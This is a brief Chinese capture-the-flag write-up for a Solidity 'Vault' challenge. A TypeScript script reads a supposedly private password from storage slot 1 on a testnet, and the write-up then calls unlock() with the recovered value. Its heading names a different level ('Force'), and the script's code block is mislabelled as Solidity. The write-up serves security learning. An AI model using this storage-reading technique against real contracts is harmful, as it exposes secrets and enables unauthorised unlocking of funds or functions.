# 07 - Force

## 题目
将以下合约解锁
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## 解题
在这个合约中，只需要直接在链上读这个合约的 storage值即可，typescript 脚本如下：
```solidity

        let provider = new providers.JsonRpcProvider("https://ethereum-holesky.publicnode.com");
        const contractAddress = "";//合约地址

        // 读取存储槽 1 的内容
        const storageAtSlot1 = await provider.getStorageAt(contractAddress, 1);
    
        console.log("Password (bytes32):", storageAtSlot1);
        console.log("Password (UTF-8):", ethers.utils.toUtf8String(storageAtSlot1).replace(/\0/g, ''));
        
        //2293808
        //Password (bytes32): 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        //Password (UTF-8): A very strong secret password :)
        
```

在浏览器的 console 输入：contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
